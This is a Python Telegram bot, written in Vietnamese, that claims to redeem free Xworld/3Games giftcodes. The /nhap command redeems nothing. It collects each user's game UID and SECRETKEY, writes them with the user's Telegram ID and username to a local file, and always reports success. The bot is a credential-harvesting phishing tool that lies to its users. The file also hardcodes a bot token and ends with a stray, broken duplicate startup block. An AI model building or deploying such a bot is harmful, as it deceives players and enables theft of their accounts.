import logging
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# Bật logging (giúp debug nếu cần)
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Hàm xử lý /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🎯 BOT nhập code Xworld FREE (free đến khi bot sập)\n\n"
        "⚡ Dùng lệnh: /nhap CODE UID SECRETKEY SLL\n\n"
        "🌐 Chế độ cộng đồng: /reg /cd /rt\n"
        "📘 Dùng lệnh /hd để xem hướng dẫn chi tiết\n"
        "🎮 Bot sẵn sàng nhập giftcode 3Games!"
    )

# Hàm xử lý /hd
async def hd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "💡 Cách sử dụng:\n"
        "• /nhap CODE (dùng tài khoản đã đăng ký)\n"
        "• /nhap CODE SLL (dùng tài khoản đã đăng ký)\n"
        "• /nhap CODE UID SECRETKEY SLL (dùng tài khoản mới)"
    )

# Hàm xử lý /nhap
async def nhap(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    user = update.effective_user

    if len(args) == 1:
        code = args[0]
        response = "✅ Nhập code thành công (đã đăng ký)"
        save_data(user.id, user.username, code)
    elif len(args) == 2 and args[1].upper() == "SLL":
        code, sll = args
        response = "✅ Nhập code + SLL thành công (đã đăng ký)"
        save_data(user.id, user.username, code, sll=sll)
    elif len(args) == 4:
        code, uid, secretkey, sll = args
        response = "✅ Tạo tài khoản mới + nhập code thành công!"
        save_data(user.id, user.username, code, uid, secretkey, sll)
    else:
        response = (
            "⚠️ CÚ PHÁP KHÔNG ĐÚNG! ⚠️\n\n"
            "💡 Cách sử dụng:\n"
            "• /nhap CODE (dùng tài khoản đã đăng ký)\n"
            "• /nhap CODE SLL (dùng tài khoản đã đăng ký)\n"
            "• /nhap CODE UID SECRETKEY SLL (dùng tài khoản mới)"
        )
    
    await update.message.reply_text(response)

# Hàm lưu dữ liệu
def save_data(user_id, username, code, uid=None, secretkey=None, sll=None):
    with open("data.txt", "a", encoding="utf-8") as f:
        f.write(f"UserID: {user_id}, Username: {username}, CODE: {code}")
        if uid: f.write(f", UID: {uid}")
        if secretkey: f.write(f", SECRETKEY: {secretkey}")
        if sll: f.write(f", SLL: {sll}")
        f.write("\n")

# Khởi động bot
def main():
    app = ApplicationBuilder().token("7287252017:AAHkM3YYkxCcRV9E69ZaPwMdD2zuDP4y3vA").build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("hd", hd))
    app.add_handler(CommandHandler("nhap", nhap))

    app.run_polling()

if __name__ == "__main__":
    main()
    application = ApplicationBuilder().token("YOUR_TOKEN").build()

    application.add_handler(CommandHandler("start", start))
    # thêm handler khác nếu có

    application.run_polling()
    
